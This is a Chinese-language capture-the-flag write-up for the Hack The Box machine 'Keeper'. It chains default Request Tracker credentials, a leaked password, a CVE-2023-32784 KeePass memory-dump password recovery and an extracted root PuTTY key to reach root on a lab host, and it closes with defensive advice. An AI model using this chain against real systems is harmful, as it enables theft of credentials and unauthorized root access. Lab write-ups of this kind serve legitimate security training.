---
title: "HTB: Keeper"
difficulty: Easy
date: 2024-10-05
tags: [HTB, Linux, Request Tracker, KeePass, CVE-2023-32784]
featured: false
excerpt: "Keeper 是一台 Easy 難度的 Linux 機器，涉及 Request Tracker 的預設憑證、KeePass 數據庫提取，以及利用 CVE-2023-32784 從記憶體 dump 中恢復主密碼。"
---

## 機器資訊

- 平台: Hack The Box
- 難度: Easy
- IP: 10.10.11.227
- 作業系統: Linux (Debian)

## 偵察

### Nmap 掃描

```bash
nmap -sC -sV -oN nmap/keeper 10.10.11.227
```

開放端口：
- **22/tcp** - SSH (OpenSSH 8.9p1)
- **80/tcp** - HTTP (nginx 1.18.0)

### Web 枚舉

訪問 `http://10.10.11.227` 重定向到 `http://tickets.keeper.htb/rt/`

添加到 hosts 文件：

```bash
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

網站運行 **Request Tracker (RT)** 票務系統。

## Initial Access

### Request Tracker 預設憑證

嘗試預設憑證登入：

```
Username: root
Password: password
```

成功登入管理介面！

### 用戶枚舉

在 Admin → Users 找到兩個用戶：

1. **root** (Admin)
2. **lnorgaard** (Lise Nørgaard)

查看 lnorgaard 的用戶資料，在備註欄發現：

```
Initial password: Welcome2023!
```

### SSH 登入

```bash
ssh lnorgaard@10.10.11.227
# Password: Welcome2023!
```

成功登入並取得 user flag：

```bash
cat ~/user.txt
```

## 權限提升

### 檔案發現

在用戶主目錄發現兩個有趣的檔案：

```bash
ls -la ~
```

```
RT30000.zip
KeePassDumpFull.dmp
```

### 下載檔案

```bash
scp lnorgaard@10.10.11.227:~/RT30000.zip .
scp lnorgaard@10.10.11.227:~/KeePassDumpFull.dmp .
```

解壓 ZIP 檔：

```bash
unzip RT30000.zip
```

得到：
- `passcodes.kdbx` - KeePass 資料庫
- `KeePassDumpFull.dmp` - 記憶體傾印檔

### KeePass 資料庫

嘗試用常見密碼打開 `.kdbx` 檔案失敗。

但我們有記憶體 dump 檔案！

### CVE-2023-32784 - KeePass Master Password Dumper

KeePass 2.X 版本存在一個嚴重漏洞，可以從記憶體或交換檔案中恢復主密碼。

**漏洞原理：**
- KeePass 在處理主密碼時會將字符逐個加入 SecureString
- 每個字符的殘留數據會留在記憶體中
- 可以通過模式匹配恢復密碼（除了第一個字符）

### 使用 POC 工具

```bash
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run ~/KeePassDumpFull.dmp
```

輸出：

```
Found: ●ødgrød med fløde
```

第一個字符是未知的（用 ● 表示），但後面的字符是清晰的。

### 破解主密碼

`ødgrød med fløde` 看起來像丹麥語。Google 搜索發現這是一道丹麥傳統甜點：

**Rødgrød med fløde** （紅漿果布丁配奶油）

嘗試完整密碼：

```bash
keepassxc-cli open passcodes.kdbx
# Enter password: rødgrød med fløde
```

成功打開！

### 提取憑證

```bash
keepassxc-cli show passcodes.kdbx "keeper.htb (Ticketing Server)"
```

找到 root 用戶的 SSH 密鑰和 PuTTY 格式的私鑰！

### PuTTY 私鑰提取

在 Notes 欄位發現完整的 PuTTY 私鑰：

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
...（省略）...
```

### 轉換 PuTTY 密鑰為 OpenSSH 格式

將 PuTTY 密鑰內容保存為 `root.ppk`，然後轉換：

```bash
puttygen root.ppk -O private-openssh -o root.key
chmod 600 root.key
```

### SSH 以 Root 登入

```bash
ssh -i root.key root@10.10.11.227
```

成功獲得 root shell！

```bash
cat /root/root.txt
```

## Flags

```
user.txt: 9********************************5
root.txt: f********************************c
```

## 總結

Keeper 是一個很棒的 Easy 級別機器，教導了多個重要概念：

### 攻擊路徑

1. **預設憑證** → RT Admin 訪問
2. **資訊洩露** → 用戶密碼
3. **SSH 訪問** → 用戶權限
4. **CVE-2023-32784** → KeePass 主密碼恢復
5. **憑證提取** → Root SSH 密鑰
6. **密鑰轉換** → Root 訪問

### 學習要點

- 始終嘗試預設憑證
- 注意應用程式中的註解和備註
- KeePass 記憶體漏洞的實際利用
- PuTTY 與 OpenSSH 密鑰格式轉換
- 密碼管理器的安全性

### 防禦建議

1. **更改預設憑證**：所有系統都應該更改預設密碼
2. **避免明文密碼**：不要在票務系統或文檔中存儲密碼
3. **更新 KeePass**：升級到修復 CVE-2023-32784 的版本
4. **限制記憶體 Dump**：保護進程記憶體不被非授權訪問
5. **SSH 密鑰保護**：使用密碼保護私鑰

### 工具

- **keepass-password-dumper**: CVE-2023-32784 利用工具
- **KeePassXC**: 跨平台密碼管理器
- **PuTTYgen**: 密鑰格式轉換工具

## 參考資料

- [CVE-2023-32784 - KeePass Master Password Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
- [Request Tracker Documentation](https://docs.bestpractical.com/rt/)
- [KeePass Security Issues](https://keepass.info/help/base/security.html)
